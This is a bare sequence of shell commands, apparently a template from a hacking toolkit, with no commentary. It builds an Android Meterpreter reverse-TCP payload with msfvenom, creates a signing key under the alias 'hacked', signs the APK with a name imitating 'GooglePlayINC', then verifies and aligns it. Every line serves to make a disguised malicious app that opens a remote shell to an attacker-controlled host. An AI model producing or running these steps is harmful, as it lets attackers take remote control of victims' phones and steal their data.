msfvenom –p android/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} R> {ANDROID_FILENAME}

keytool -genkey -V -keystore key.keystore -alias hacked -keyalg RSA -keysize 2048 -validity 10000


jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore {ANDROID_FILENAME} GooglePlayINC


jarsigner -verify -verbose -certs {ANDROID_FILENAME}

zipalign -v 4 {ANDROID_FILENAME} signed.apk
